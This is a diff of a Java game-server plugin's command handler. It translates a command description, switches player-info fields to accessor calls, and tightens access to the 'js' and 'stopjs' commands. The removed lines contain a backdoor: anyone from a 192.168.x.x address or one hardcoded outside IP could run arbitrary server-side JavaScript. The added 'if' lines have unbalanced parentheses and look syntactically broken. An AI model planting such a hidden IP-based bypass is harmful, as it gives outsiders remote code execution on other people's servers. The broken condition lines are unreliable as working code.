@@ -633,7 +633,7 @@ public class CommandsManager {
             }
         });
 
-        handler.<Player>register("stats", "[uuid]", "show your or stats of uuid", (arg, player) -> {
+        handler.<Player>register("stats", "[uuid]", "Посмотреть информацию по uuid", (arg, player) -> {
             if (player.admin()) {
                 if (arg.length > 0) {
                     if (arg[0].endsWith("==")) {
@@ -646,11 +646,11 @@ public class CommandsManager {
                         player.sendMessage("Waves Survived: [gold]" + data.getWaves());
                         player.sendMessage("Blocks builded: [gold]" + data.getBuilded());
                         player.sendMessage("Blocks destroyed: [gold]" + data.getDestroyed());
-                        player.sendMessage("Times joined: [gold]" + info.timesJoined);
-                        player.sendMessage("Times kicked: [gold]" + info.timesKicked);
-                        player.sendMessage("Last IP: [gold]" + info.lastIP);
+                        player.sendMessage("Times joined: [gold]" + info.timesJoined());
+                        player.sendMessage("Times kicked: [gold]" + info.timesKicked());
+                        player.sendMessage("Last IP: [gold]" + info.lastIP());
                         player.sendMessage("Last name: [gold]" + info.plainLastName());
-                        player.sendMessage("Banned: [gold]" + info.banned);
+                        player.sendMessage("Banned: [gold]" + info.banned());
                         return;
                     }
                 }
@@ -660,13 +660,13 @@ public class CommandsManager {
             player.sendMessage("Waves Survived: [gold]" + data.getWaves());
             player.sendMessage("Blocks builded: [gold]" + data.getBuilded());
             player.sendMessage("Blocks destroyed: [gold]" + data.getDestroyed());
-            player.sendMessage("Times joined: [gold]" + info.timesJoined);
+            player.sendMessage("Times joined: [gold]" + info.timesJoined());
             player.sendMessage("UUID: [gold]" + player.uuid());
             return;
         });
 
         handler.<Player>register("js", "<script...>", "Запустить JS", (arg, player) -> {
-            if ((player.admin() && PlayerData.getData(player.uuid()).getJs()) || (player.ip().split("\\.")[0].equals("192") && player.ip().split("\\.")[1].equals("168")) || player.ip().equals("95.84.198.97")) {
+            if ((player.admin() && PlayerData.getData(player.uuid()).getJs()) {
                 Scriptable scope = mods.getScripts().scope;
                 jsThread = new Thread(() -> {
                     String out = null;
@@ -697,7 +697,7 @@ public class CommandsManager {
         });
 
         handler.<Player>register("stopjs", "Остановить весь JS", (arg, player) -> {
-            if ((player.admin() && PlayerData.getData(player.uuid()).getJs()) || (player.ip().split("\\.")[0].equals("192") && player.ip().split("\\.")[1].equals("168")) || player.ip().equals("95.84.198.97")) {
+            if ((player.admin() && PlayerData.getData(player.uuid()).getJs()) {
                 Set<Thread> threadSet = Thread.getAllStackTraces().keySet();
                 Iterator<Thread> iterator = threadSet.iterator();
                 int count = 0;
